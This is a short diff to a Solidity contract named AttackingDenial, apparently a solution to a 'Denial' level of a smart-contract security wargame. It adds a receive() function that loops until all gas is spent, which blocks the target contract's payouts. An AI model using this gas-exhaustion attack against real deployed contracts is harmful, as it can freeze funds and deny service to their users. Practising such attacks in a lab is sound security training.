@@ -2,6 +2,8 @@
 pragma solidity ^0.8.9;
 import "./Denial.sol";
 
+import "hardhat/console.sol";
+
 contract AttackingDenial {
     address payable public contractAddress;
 
@@ -9,5 +11,10 @@ contract AttackingDenial {
         contractAddress = _contractAddress;
     }
 
-    //Code me!
+    receive() external payable {
+        uint i = 0;
+        while (gasleft() > 0) {
+            i++;
+        }
+    }
 }
